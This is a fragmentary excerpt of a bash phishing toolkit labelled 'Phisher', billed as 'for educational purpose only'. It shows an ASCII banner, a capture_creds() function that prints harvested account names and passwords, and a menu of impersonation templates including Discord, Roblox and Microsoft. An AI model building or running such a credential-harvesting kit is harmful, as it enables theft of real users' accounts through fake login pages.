...
${BLUE}             ...^^.^!~  :^ ${WHITE} ~.  .^~...-^              
       ...
       ${CYAN}THC tool made for educational purpose only. 	${ORANGE}Version: 3.0  ${WHITE} - Team Cybersapiens
...
${BLUE}             .::::::: ${WHITE}::::::::.                
${BLUE}            .^..^~.  ~${WHITE}:~ .: :::::.           
${BLUE}          ::::  ..^^:~${WHITE}:^ ::.   ..:^          ${BLUE}  _______          _________ _______           _______  _______
${BLUE}         ^:.::..:::::~${WHITE}:~^.:~.  :^ .^         ${BLUE} (  ____ )|\     /|\__   __/(  ____ \|\     /|(  ____ \(  ____ )
${BLUE}        :^  ^~..::^:.^${WHITE}:!.  ^.   ^. ^^        ${BLUE} | (    )|| )   ( |   ) (   | (    \/| )   ( || (    \/| (    )|
${BLUE}       .:^::.~^. : :^^${WHITE}:^   .^..:::: :^.      ${BLUE} | (____)|| (___) |   | |   | (_____ | (___) || (__    | (____)|
${BLUE}      ^^.::^::^.:^^: ~${WHITE}:~  ^:.~:^^ :^  ~.     ${WHITE} |  _____)|  ___  |   | |   (_____  )|  ___  ||  __)   |     __)
${BLUE}    .~^!:  . .^:  .:^.${WHITE}!:. ^~!  ^. :^ :^      ${WHITE} | (      | (   ) |   | |         ) || (   ) || (      | (\ (   
${BLUE}     :~. ~~~ ^^       ${WHITE}.^ .^. ~:::^:::^^^     ${WHITE} | )      | )   ( |___) (___/\____) || )   ( || (____/\| ) \ \_
${BLUE}    ^:..::.::^.       ${WHITE}.^  :^     .::..:..    ${WHITE} |/       |/     \|\_______/\_______)|/     \|(_______/|/   \__/
${BLUE}   .^:~~   .~.        ${WHITE}.^ ::^.    ::.:...^:   
${BLUE}   :^^:.:^: :^        ${WHITE}.~ .^ .......     ~:   
${BLUE}   :^:^..~. :^        ${WHITE} .::~^:^^   .^ ^^^:^:  
${BLUE}  :^ ^^: ~  ^:        ${WHITE}    .:::::~. ~ ..  .~  			${ORANGE}Version: 3.0  ${WHITE} - Team Cybersapiens
${BLUE}  :^  ::::^: .~      .${WHITE} ..      :~^..:.:::~.  
${BLUE}   ~:   ::.:~^^:   ::~${WHITE}.~^~^::::~~  .:..^ ~   
${BLUE}   ~.:^^::^:..:~~^^^ ~${WHITE}:^  ~!.  ....:.^. .~   
${BLUE}   .^^^..~:  :^^^^:. ~${WHITE}:^   ~:..    ^. ^:^.   
...
capture_creds() {
	...
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${WHITE} Account : ${RED}$ACCOUNT"
	echo -e "\n${RED}[${WHITE}-${RED}]${WHITE} Password : ${RED}$PASSWORD"
...
main_menu() {
	...
	cat <<- EOF
		...
		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox 	  ${RED}[${WHITE}36${RED}]${ORANGE} Microsoft New
